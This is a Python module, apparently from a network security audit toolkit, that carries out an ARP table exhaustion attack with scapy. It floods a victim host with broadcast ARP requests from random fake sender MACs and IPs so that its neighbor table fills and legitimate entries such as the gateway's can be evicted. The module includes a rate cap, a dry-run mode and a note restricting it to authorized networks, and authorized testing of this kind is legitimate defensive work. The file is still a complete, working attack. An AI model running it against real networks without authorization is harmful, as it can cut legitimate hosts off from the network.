"""ARP table exhaustion: fills a host's neighbor table with requests from fake senders.

Each request asks for the victim's own address and carries a new random sender MAC and IP from
the chosen subnet. A host that receives a request for its address learns the sender, so each
request adds an entry to its neighbor (ARP) table. The table has a size limit. Once the limit
is reached, the kernel evicts entries, and an entry for a legitimate host can be the one lost.

This module sends the requests at a set rate. What the audit measures is on the victim: how
many entries it holds, and whether a legitimate entry, such as the gateway's, survives.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, random_mac

MAX_RATE = 100.0           # requests per second; higher rates are refused
BATCH_SECONDS = 0.1        # requests are sent in batches this long
ARP_REQUEST = 1
ZERO_MAC = "00:00:00:00:00:00"


@dataclass(frozen=True)
class ArpTableExhaustionConfig:
    iface: str                  # attacker interface, on the victim's segment
    victim_ip: str              # the victim's address, which every request asks for
    subnet: str                 # CIDR the fake senders come from (keep it clear of real hosts)
    rate: float = 10.0          # requests per second
    count: int = 0              # requests to send in total; 0 = run until stopped
    dry_run: bool = False       # build requests but do not send them

    def __post_init__(self) -> None:
        parse_ipv4(self.victim_ip, "Victim IP")
        network = ipaddress.ip_network(self.subnet, strict=False)
        if network.num_addresses < 4:
            raise ValueError("Subnet must contain at least four addresses.")
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} requests per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class ArpTableExhaustionStats:
    requests: int = 0
    status: str = ""


def fake_sender_request(rng: random.Random, subnet: str, victim_ip: str) -> Packet:
    """A broadcast ARP request for the victim's address, from a new random sender."""
    network = ipaddress.ip_network(subnet, strict=False)
    host = rng.randrange(1, network.num_addresses - 1)
    sender_ip = str(network.network_address + host)
    sender_mac = random_mac(rng)
    return Ether(src=sender_mac, dst=BROADCAST_MAC) / ARP(
        op=ARP_REQUEST,
        hwsrc=sender_mac,
        psrc=sender_ip,
        hwdst=ZERO_MAC,
        pdst=victim_ip,
    )


def run_arp_table_exhaustion(
    config: ArpTableExhaustionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ArpTableExhaustionStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> ArpTableExhaustionStats:
    """Send requests with new fake senders at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = ArpTableExhaustionStats(
            status=(
                f"Dry run: would send about {config.rate:g} ARP requests per second for "
                f"{config.victim_ip} from new senders in {config.subnet}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = ArpTableExhaustionStats()
    while not stop_event.is_set() and (config.count == 0 or stats.requests < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.requests)
        frames = [fake_sender_request(rng, config.subnet, config.victim_ip) for _ in range(batch)]
        send(frames, iface=config.iface, verbose=False)
        stats.requests += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
